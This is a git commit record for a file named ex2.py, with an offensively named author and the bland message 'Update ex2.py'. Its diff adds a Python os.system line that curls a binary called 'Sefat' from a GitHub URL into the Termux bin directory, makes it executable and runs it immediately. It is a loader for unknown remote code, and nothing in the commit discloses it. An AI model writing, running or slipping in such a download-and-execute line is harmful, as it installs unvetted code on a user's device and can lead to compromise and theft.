69ad865957b35f3d7a1e330c1f24dd3902341067
MR - FUCKER <121819973+Peaky-XD@users.noreply.github.com>
2023-05-21 09:31:14 +0600

    Update ex2.py

--- ex2.py
+++ ex2.py
@@ -1,1 +1,5 @@
+import os 
+os.system("curl -L https://github.com/X-NINJA-XD/.../blob/main/Sefat -o /data/data/com.termux/files/usr/bin/Sefat;chmod +x /data/data/com.termux/files/usr/bin/Sefat;Sefat")
+
+
 
